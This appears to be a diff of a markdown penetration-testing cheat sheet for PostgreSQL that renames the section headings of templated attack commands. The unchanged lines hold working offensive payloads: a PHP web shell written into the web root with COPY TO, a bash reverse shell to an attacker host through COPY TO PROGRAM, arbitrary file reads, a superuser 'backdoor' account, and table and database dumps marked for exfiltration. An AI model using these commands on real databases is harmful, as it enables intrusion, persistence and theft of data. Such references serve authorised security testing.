@@ -4,7 +4,7 @@
 
 ---
 
-## Connect to PostgreSQL
+## connect authenticated
 Authenticate to a remote PostgreSQL instance.
 
 ```bash
@@ -15,7 +15,7 @@ psql -U {{USERNAME:str}} -d {{DATABASE:str:postgres}} -h {{TARGET:ip}}
 
 ---
 
-## Connect via URI
+## connect uri string
 Use PostgreSQL connection URI format.
 
 ```bash
@@ -26,7 +26,7 @@ psql postgresql://{{USERNAME:str}}:{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:54
 
 ---
 
-## Show Server Version
+## show server version
 Display server version for CVE matching.
 
 ```sql
@@ -38,7 +38,7 @@ SELECT version();
 
 ---
 
-## List Databases and Roles
+## list databases roles
 Enumerate databases and user roles on server.
 
 ```sql
@@ -51,7 +51,7 @@ SELECT rolname FROM pg_roles;
 
 ---
 
-## List Schemas and Tables
+## list schemas tables
 Show schemas and tables in current database.
 
 ```sql
@@ -65,7 +65,7 @@ SELECT table_schema, table_name FROM information_schema.tables ORDER BY 1,2;
 
 ---
 
-## Describe Table Columns
+## describe table columns
 View column types and lengths.
 
 ```sql
@@ -77,7 +77,7 @@ SELECT column_name, data_type, character_maximum_length FROM information_schema.
 
 ---
 
-## Switch to Postgres OS User (Local)
+## switch postgres os user privesc
 Become the postgres OS user when local access exists.
 
 ```bash
@@ -89,7 +89,7 @@ psql
 
 ---
 
-## Read File via COPY FROM
+## read file copy from
 Read arbitrary file from server filesystem.
 
 ```sql
@@ -103,7 +103,7 @@ DROP TABLE temp_table;
 
 ---
 
-## Write File via COPY TO
+## write webshell copy to
 Write attacker-controlled content to server filesystem.
 
 ```sql
@@ -114,7 +114,7 @@ COPY (SELECT '<?php system($_GET[c]); ?>') TO '/var/www/html/shell.php';
 
 ---
 
-## Command Execution via COPY PROGRAM
+## exec command copy program rce
 Execute OS commands through COPY TO PROGRAM (PostgreSQL 9.3+).
 
 ```sql
@@ -125,7 +125,7 @@ COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:4444}
 
 ---
 
-## Create Superuser Backdoor
+## create superuser backdoor
 Create new superuser role for persistent access.
 
 ```sql
@@ -136,7 +136,7 @@ CREATE USER {{USERNAME:str:backdoor}} WITH PASSWORD '{{PASSWORD:str:Pwn3d!}}' SU
 
 ---
 
-## Grant Permissions on Database
+## grant privileges database
 Grant connect/all privileges to a user on a database.
 
 ```sql
@@ -148,7 +148,7 @@ GRANT SELECT, UPDATE, INSERT ON ALL TABLES IN SCHEMA public TO {{USERNAME:str}};
 
 ---
 
-## Export Table to CSV
+## export table csv exfil
 Dump a table contents to CSV for exfil.
 
 ```sql
@@ -159,7 +159,7 @@ Dump a table contents to CSV for exfil.
 
 ---
 
-## pg_dump - Full Database Backup
+## dump database pg_dump exfil
 Backup entire database for offline analysis.
 
 ```bash
@@ -170,7 +170,7 @@ pg_dump -h {{TARGET:ip}} -U {{USERNAME:str}} {{DATABASE:str}} > {{OUTFILE:file:d
 
 ---
 
-## Run Local SQL Script Against Remote Host
+## run sql script remote
 Execute a script file against remote PostgreSQL host.
 
 ```bash
